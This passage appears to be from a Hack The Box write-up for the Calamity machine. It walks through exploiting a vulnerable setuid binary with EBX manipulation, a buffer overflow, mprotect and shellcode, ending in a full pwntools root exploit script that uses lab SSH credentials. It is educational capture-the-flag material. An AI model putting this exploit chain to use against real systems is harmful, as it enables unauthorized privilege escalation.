The program uses EBX+0x7c as a reference for `hey.session`. If I change EBX to be eight less than it is intended, the what the program thinks is `hey.session` now points to `hey.secret`, meaning a call to `printdeb` will leak it. After I change EBX, the references `main` uses to get things from `hey` will be wrong (in a good way):

![image-20200826060301644](https://0xdfimages.gitlab.io/img/image-20200826060301644.png)

The value stored in EBX isn’t changing from run to run. It’s static 0xbffff658. I can subtract 8:

```

gdb-peda$ p $ebx - 8
$17 = 0x80002ff8

```

That’s the value I’ll want to overwrite it EBX with.

I’ll start a Python script. First it will use the PwnTools `ssh` object to connect to Calamity, and start the `goodluck` process. I can use `upload_data` to create files on Calamity, so I’ll write this first stage to a randomly named file in `/tmp`, and then read that file from `goodluck`, then calling option 2 to leak `hey.secret`:

```

#!/usr/bin/env python3

import re
from pwn import *

sshConn = ssh(host="10.10.10.27", user="xalvas", password="18547936..*")
goodluck = sshConn.process("/home/xalvas/app/goodluck")
fn = f"/tmp/{randoms(10)}"

## Stage 1 - Leak hey.secret
log.info(f'Writing Stage 1 exploit to {fn}')
sshConn.upload_data(b"A" * 8 + p32(0x80002FF8), fn)
goodluck.sendline(fn)
goodluck.recv(4096)
goodluck.sendline("2")
resp = goodluck.recv(4096).decode()
secret = re.findall(r'debug info: (0x[0-9a-f]+)', resp)[0]
log.success(f"Found secret: {secret}")

```

It works:

```

root@kali# python3 rootpwn.py 
[x] Connecting to 10.10.10.27 on port 22
[+] Connecting to 10.10.10.27 on port 22: Done
[*] xalvas@10.10.10.27:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     i386
    Version:  4.4.0
    ASLR:     Disabled
    Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
[x] Starting remote process '/home/xalvas/app/goodluck' on 10.10.10.27
[+] Starting remote process '/home/xalvas/app/goodluck' on 10.10.10.27: pid 5001
[+] Found secret: 0x1079d23

```

#### Stage 2 - Access Debug

Next I want to call option 3 with `hey` such that I can access the `debug` function. I’ll need to have two conditions:
- `protect == hey.secret`
- `hey.admin != 0`

I can use option 4 to shift EBX again, so I can realign where the computer thinks `hey`. This time, I’ll shift so that it tries to check `hey.secret` it gets `hey.user` instead. I can control the first four bytes of `hey.user`, and I leaked `hey.secret`, so I can set it to match, passing the first test.

![image-20200826060321674](https://0xdfimages.gitlab.io/img/image-20200826060321674.png)

Once I do that, the programs reference to `hey.admin`, EBX+0x78, now points to the middle four bytes in `hey.user`. The first byte will be overwritten with a 0 in the reading process, but the rest is some non-zero value, and will pass the second test, and go to debug.

EBX just needs to be shifted 4 more bytes from what it was in stage 1, to :

```

gdb-peda$ p 0x80002ff8 - 4
$4 = 0x80002ff4

```

I’ll add stage 2 to the script:

```

## Stage 2 - Access Debug
log.info(f'Writing Stage 2 exploit to {fn}')
sshConn.upload_data(p32(int(secret, 16)) + b'AAAA' + p32(0x80002ff4), fn)
goodluck.sendline("4")
goodluck.recv(4096)
goodluck.sendline(fn)
goodluck.recv(4096)
goodluck.sendline("3")
print(goodluck.recv(4096).decode())

```

It prints out the start of `debug` and waits for a filename:

```

root@kali# python3 rootpwn.py 
[x] Connecting to 10.10.10.27 on port 22
[+] Connecting to 10.10.10.27 on port 22: Done
[*] xalvas@10.10.10.27:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     i386
    Version:  4.4.0
    ASLR:     Disabled
    Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
[x] Starting remote process '/home/xalvas/app/goodluck' on 10.10.10.27
[+] Starting remote process '/home/xalvas/app/goodluck' on 10.10.10.27: pid 8366
[+] Found secret: 0x1019d3b

this function is problematic on purpose

I'm trying to test some things...and that means get control of the program! 
vulnerable pointer is at bffffbf0
memory information on this binary:

80000000-80002000 r-xp 00000000 08:01 404837     /home/xalvas/app/goodluck
80002000-80003000 r--p 00001000 08:01 404837     /home/xalvas/app/goodluck
80003000-80004000 rw-p 00002000 08:01 404837     /home/xalvas/app/goodluck
80004000-80025000 rw-p 00000000 00:00 0          [heap]
b7e1a000-b7e54000 r-xp 00000000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7e54000-b7e55000 r--p 0003a000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7e55000-b7fca000 r-xp 0003b000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fca000-b7fcc000 r--p 001af000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fcc000-b7fcd000 rw-p 001b1000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fcd000-b7fd0000 rw-p 00000000 00:00 0 
b7fd6000-b7fd8000 rw-p 00000000 00:00 0 
b7fd8000-b7fda000 r--p 00000000 00:00 0          [vvar]
b7fda000-b7fdb000 r-xp 00000000 00:00 0          [vdso]
b7fdb000-b7ffd000 r-xp 00000000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
b7ffd000-b7ffe000 rw-p 00000000 00:00 0 
b7ffe000-b7fff000 r--p 00022000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
b7fff000-b8000000 rw-p 00023000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
bfedf000-c0000000 rw-p 00000000 00:00 0          [stack]

Filename:

```
***Update 2 Jan 2022***: Someone pointed out that the script above isn’t working completely reliably, and it’s because of how I’m calling `recv` instead of `recvuntil`. I’ve updated the script replacing `print(goodluck.recv(4096).decode())` with `resp = goodluck.recvuntil(b"Filename: ").decode()`. [This video](https://www.youtube.com/watch?v=79mUGY3-dJQ) shows how I figured that out:

#### Find Offset in debug

I left off at a file prompt, but this time I can give a file and it will read 100 bytes into a 64 byte buffer. I’m not just messing with EBX here, but I should be able to overwrite the return address and get more control. First, I need to find the offset to the overwrite.

I’ll use `msf-pattern_create` to create a pattern:

```

root@kali# msf-pattern_create -l 120
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9

```

I need to run in `gdb` to get EIP when this crashes. I could run the exploit locally, or just do a manual exploitation on Calamity. I opted for the latter.

I’ll write the stage 1 exploit to a file:

```

xalvas@calamity:~$ echo -en "AAAAAAAA\xf8\x2f\x00\x80" > /tmp/0xdf

```

Now I’ll run `goodluck` in `gdb` up to the leak:

```

xalvas@calamity:~$ gdb -q app/goodluck
Reading symbols from app/goodluck...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /home/xalvas/app/goodluck 

Filename:  /tmp/0xdf
        -----MENU-----
1) leave message to admin
2) print session ID
3)login (admin only)
4)change user
5)exit

 action: 2

debug info: 0x109616d
        -----MENU-----
1) leave message to admin
2) print session ID
3)login (admin only)
4)change user
5)exit

 action:

```

Now I’ll use that leaked secret to write stage 2:

```

xalvas@calamity:~$ echo -en "\x6d\x61\x09\x01AAAA\xf4\x2f\x00\x80" > /tmp/0xdf

```

I’ll continue:

```

 action: 4

Filename:  /tmp/0xdf
        -----MENU-----
1) leave message to admin
2) print session ID
3)login (admin only)
4)change user
5)exit

 action: 3

this function is problematic on purpose

I'm trying to test some things...and that means get control of the program! 
vulnerable pointer is at bffff5c0
memory information on this binary:

80000000-80002000 r-xp 00000000 08:01 404837     /home/xalvas/app/goodluck
80002000-80003000 r--p 00001000 08:01 404837     /home/xalvas/app/goodluck
80003000-80004000 rw-p 00002000 08:01 404837     /home/xalvas/app/goodluck
80004000-80025000 rw-p 00000000 00:00 0          [heap]
b7e1a000-b7e54000 r-xp 00000000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7e54000-b7e55000 r--p 0003a000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7e55000-b7fca000 r-xp 0003b000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fca000-b7fcc000 r--p 001af000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fcc000-b7fcd000 rw-p 001b1000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fcd000-b7fd0000 rw-p 00000000 00:00 0 
b7fd6000-b7fd8000 rw-p 00000000 00:00 0 
b7fd8000-b7fda000 r--p 00000000 00:00 0          [vvar]
b7fda000-b7fdb000 r-xp 00000000 00:00 0          [vdso]
b7fdb000-b7ffd000 r-xp 00000000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
b7ffd000-b7ffe000 rw-p 00000000 00:00 0 
b7ffe000-b7fff000 r--p 00022000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
b7fff000-b8000000 rw-p 00023000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
bfedf000-c0000000 rw-p 00000000 00:00 0          [stack]

Filename:

```

Put the pattern into a file:

```

xalvas@calamity:~$ echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9" > /tmp/0xdf

```

And give that to the `debug` function. On hitting enter, it crashes:

```

Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x63413563 in ?? ()

```

I can take that back to my box and find the offset:

```

root@kali# msf-pattern_offset -q 0x63413563
[*] Exact match at offset 76

```

#### Stage 3 - Shell

My first instinct was to use a ret2libc attack. That failed, and I’ll cover it in [Beyond Root](#beyond-root).

My new strategy is to go what I believe the author is trying to force me to do, which is to get a shell with two steps:
- Make the stack executable;
- Jump to the start of the vulnerable buffer where I’ll have shellcode.

To accomplish that, I’ll overwrite

The payload will start with the shellcode to run a shell (I’ll include a call to `setuid` just in case the binary is dropping priv), followed by junk to fill out 76 bytes. Then I’ll include the return address with the address of `mprotect`. The next word will be the return address for that function, which will be the buffer. Then I’ll have the three arguments for `mprotect`.

Since the program is already waiting for a filename to read in `debug`, I just need to write this payload to a file, and then pass that filename to the program, and go interactive:

```

## Stage 3 - Shell
mprotect = 0xb7efcd50
size = stack_end - stack_start
shellcode = asm(shellcraft.setuid(0) + shellcraft.execve('/bin/sh'))

payload =  shellcode
payload += b"A" * (76 - len(shellcode))
payload += p32(mprotect)
payload += p32(buff_addr)
payload += p32(stack_start)
payload += p32(size)
payload += p32(7)
log.info(f'Writing Stage 3 exploit to {fn}')
sshConn.upload_data(payload, fn)

goodluck.sendline(fn)
log.info(f'Cleaning up {fn}')
sshConn.unlink(fn)
goodluck.interactive(prompt='')

```

This script returns a root shell:

```

root@kali# python3 rootpwn.py 
[+] Connecting to 10.10.10.27 on port 22: Done
[*] xalvas@10.10.10.27:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     i386
    Version:  4.4.0
    ASLR:     Disabled
    Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
[+] Starting remote process '/home/xalvas/app/goodluck' on 10.10.10.27: pid 11358
[*] Writing Stage 1 exploit to /tmp/nflklqsofz
[+] Found secret: 0x10d0f1b
[*] Writing Stage 2 exploit to /tmp/nflklqsofz
[+] Address of next buffer: 0x3221224432
[+] Stack address space: 0x3220041728 - 0x3221225472
[*] Writing Stage 3 exploit to /tmp/nflklqsofz
[*] Cleaning up /tmp/nflklqsofz
[*] Switching to interactive mode
# id
uid=0(root) gid=1000(xalvas) groups=1000(xalvas),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

```

And I can read `root.txt`:

```

# cat /root/root.txt
9be653e0************************

```

## Beyond Root

### Assembly

At the start of `main`, there’s a short section of assembly:

```

int main(int argc, char * argv[]) {
asm(
"push $0x00000001\n"
"push $0x0003add6\n"
"push $0xb7e1a000\n"
"call 0x37efcd50\n"
"add $0x0c,%esp\n"

"push $0x00000005\n"
"push $0x0003a000\n"
"push $0xb7e1a000\n"
"call 0x37efcd50\n"
"add $0x0c,%esp\n"
);

```

In debugging above, I was able to see those were calls to `mprotect`. The two calls are:
- `mprotect(0xb7e1a000, 0x3add6, PROT_EXEC)`
- `mprotect(0xb7e1a000, 0xb7e1a000, PROT_READ | PROT_EXEC)`

The flags I got from [the header file](https://unix.superglobalmegacorp.com/Net2/newsrc/sys/mman.h.html) for memory management `mman.h`.

Before this assembly runs, the memory maps look like:

```

gdb-peda$ vmmap 
Start      End        Perm      Name
0x80000000 0x80002000 r-xp      /home/xalvas/app/goodluck
0x80002000 0x80003000 r--p      /home/xalvas/app/goodluck
0x80003000 0x80004000 rw-p      /home/xalvas/app/goodluck
0xb7e1a000 0xb7fca000 r-xp      /lib/i386-linux-gnu/libc-2.23.so
0xb7fca000 0xb7fcc000 r--p      /lib/i386-linux-gnu/libc-2.23.so
0xb7fcc000 0xb7fcd000 rw-p      /lib/i386-linux-gnu/libc-2.23.so
0xb7fcd000 0xb7fd0000 rw-p      mapped
0xb7fd6000 0xb7fd8000 rw-p      mapped
0xb7fd8000 0xb7fda000 r--p      [vvar]
0xb7fda000 0xb7fdb000 r-xp      [vdso]
0xb7fdb000 0xb7ffd000 r-xp      /lib/i386-linux-gnu/ld-2.23.so
0xb7ffd000 0xb7ffe000 rw-p      mapped
0xb7ffe000 0xb7fff000 r--p      /lib/i386-linux-gnu/ld-2.23.so
0xb7fff000 0xb8000000 rw-p      /lib/i386-linux-gnu/ld-2.23.so
0xbfedf000 0xc0000000 rw-p      [stack]

```

After the first call, it’s:

```

gdb-peda$ vmmap 
Start      End        Perm      Name
...[snip]...
0xb7e1a000 0xb7e55000 r--p      /lib/i386-linux-gnu/libc-2.23.so
0xb7e55000 0xb7fca000 r-xp      /lib/i386-linux-gnu/libc-2.23.so
0xb7fca000 0xb7fcc000 r--p      /lib/i386-linux-gnu/libc-2.23.so
0xb7fcc000 0xb7fcd000 rw-p      /lib/i386-linux-gnu/libc-2.23.so
...[snip]...

```

After the second:

```

gdb-peda$ vmmap 
Start      End        Perm      Name
...[snip]...
0xb7e1a000 0xb7e54000 r-xp      /lib/i386-linux-gnu/libc-2.23.so
0xb7e54000 0xb7e55000 r--p      /lib/i386-linux-gnu/libc-2.23.so
0xb7e55000 0xb7fca000 r-xp      /lib/i386-linux-gnu/libc-2.23.so
0xb7fca000 0xb7fcc000 r--p      /lib/i386-linux-gnu/libc-2.23.so
0xb7fcc000 0xb7fcd000 rw-p      /lib/i386-linux-gnu/libc-2.23.so
...[snip]...

```

This assembly effectively takes the 0x1000 bytes in libc and makes it read only, no execute or write. When I was first here, I didn’t really understand why this was being done.

### Ret2Libc Fail

While I’ve already shown I can get a shell by making the stack executable and then jumping to my shellcode, my initial instinct was to use a return to libc attack. I walked through a lot of detail as to how this works in [Frolic](/2019/03/23/htb-frolic.html#background). Because I don’t have ASLR to contend with, the addresses in libc are static. I can find them in `gdb`:

```

gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xb7e54da0 <__libc_system>

gdb-peda$ searchmem "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xb7f759ab ("/bin/sh")   

```

While you may have already figured out how this relates to the assembly above, I didn’t notice yet, and kept going. With this information, I generated a stage three payoad:

```

"A"*76 + "\xa0\x4d\xe5\xb7EXIT\xab\x59\xf7\xb7"

```

But when I ran the exploit, it just crashed. I went with the manual method I used above to step through in gdb. When it crashed, the context was:

```

[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x41414141 ('AAAA')
ECX: 0xb7fccbcc --> 0x21000 
EDX: 0x0 
ESI: 0xb7fcc000 --> 0x1b1db0 
EDI: 0xb7fcc000 --> 0x1b1db0 
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff610 ("JUNK\253Y\367\267", 'B' <repeats 12 times>, "\375!\003\001\375!\003\001<\016")
EIP: 0xb7e54da0 --> 0x8b0cec83
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xb7e54d97 <cancel_handler+231>:     pop    ebp
   0xb7e54d98 <cancel_handler+232>:     ret    
   0xb7e54d99:                          lea    esi,[esi+eiz*1+0x0]
=> 0xb7e54da0 <__libc_system>:          sub    esp,0xc
   0xb7e54da3 <__libc_system+3>:        mov    eax,DWORD PTR [esp+0x10]
   0xb7e54da7 <__libc_system+7>:        call   0xb7f39b0d <__x86.get_pc_thunk.dx>
   0xb7e54dac <__libc_system+12>:       add    edx,0x177254
   0xb7e54db2 <__libc_system+18>:       test   eax,eax
[------------------------------------stack-------------------------------------]
0000| 0xbffff610 ("JUNK\253Y\367\267", 'B' <repeats 12 times>, "\375!\003\001\375!\003\001<\016")
0004| 0xbffff614 --> 0xb7f759ab ("/bin/sh")
0008| 0xbffff618 ('B' <repeats 12 times>, "\375!\003\001\375!\003\001<\016")
0012| 0xbffff61c ("BBBBBBBB\375!\003\001\375!\003\001<\016")
0016| 0xbffff620 ("BBBB\375!\003\001\375!\003\001<\016")
0020| 0xbffff624 --> 0x10321fd 
0024| 0xbffff628 --> 0x10321fd 
0028| 0xbffff62c --> 0x80000e3c (<main+197>:    mov    BYTE PTR [ebp-0x15],al)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
__libc_system (line=0xb7f759ab "/bin/sh") at ../sysdeps/posix/system.c:178
178     ../sysdeps/posix/system.c: No such file or directory.

```

The error code threw me for a minute, but then I looked at the address of `system`, 0xb7e54da0, and the range of libc that is no longer executable after the assembly above, 0xb7e54000 - 0xb7e55000. That assembly is to make it so that I can’t call `system`!

I looked at making a ROP payload that would make `system` executable again, and then call it, but that payload is 104 bytes long:

```

payload =  b"A" * 76             # 76
payload += p32(mprotect)         # +4 = 80
payload += p32(system)           # +4 = 84
payload += p32(protected)        # +4 = 88
payload += p32(protected_length) # +4 = 92
payload += p32(5)                # +4 = 96
payload += b'EXIT'               # +4 = 100
payload += p32(binsh)            # +4 = 104

```

There are things I could do to jump back into the buffer and keep going, but at this point, it’s just easier to go the intended path.

## Full Pwn Script

```

#!/usr/bin/env python3

import re
from pwn import *

sshConn = ssh(host="10.10.10.27", user="xalvas", password="18547936..*")
goodluck = sshConn.process("/home/xalvas/app/goodluck")
fn = f"/tmp/{randoms(10)}"

## Stage 1 - Leak hey.secret
log.info(f'Writing Stage 1 exploit to {fn}')
sshConn.upload_data(b"A" * 8 + p32(0x80002FF8), fn)
goodluck.sendline(fn)
goodluck.recv(4096)
goodluck.sendline("2")
resp = goodluck.recv(4096).decode()
secret = re.findall(r'debug info: (0x[0-9a-f]+)', resp)[0]
log.success(f"Found secret: {secret}")

## Stage 2 - Access Debug
log.info(f'Writing Stage 2 exploit to {fn}')
sshConn.upload_data(p32(int(secret, 16)) + b'AAAA' + p32(0x80002ff4), fn)
goodluck.sendline("4")
goodluck.recv(4096)
goodluck.sendline(fn)
goodluck.recv(4096)
goodluck.sendline("3")
#resp = goodluck.recv(4096).decode()
resp = goodluck.recvuntil(b"Filename:  ").decode()

buff_addr = int(re.search(r'vulnerable pointer is at ([0-9a-f]+)', resp).group(1), 16)
stack_start, stack_end = (int(x, 16) for x in re.search(r'\n([0-9a-f]{8})-([0-9a-f]{8}) rw-p 00000000 00:00 0          \[stack\]\n', resp).groups())
log.success(f'Address of next buffer: 0x{buff_addr}')
log.success(f'Stack address space: 0x{stack_start} - 0x{stack_end}')

## Stage 3 - Shell
mprotect = 0xb7efcd50
size = stack_end - stack_start
shellcode = asm(shellcraft.setuid(0) + shellcraft.execve('/bin/sh'))

payload =  shellcode
payload += b"A" * (76 - len(shellcode))
payload += p32(mprotect)
payload += p32(buff_addr)
payload += p32(stack_start)
payload += p32(size)
payload += p32(7)
log.info(f'Writing Stage 3 exploit to {fn}')
sshConn.upload_data(payload, fn)

goodluck.sendline(fn)
log.info(f'Cleaning up {fn}')
sshConn.unlink(fn)
goodluck.interactive(prompt='')

```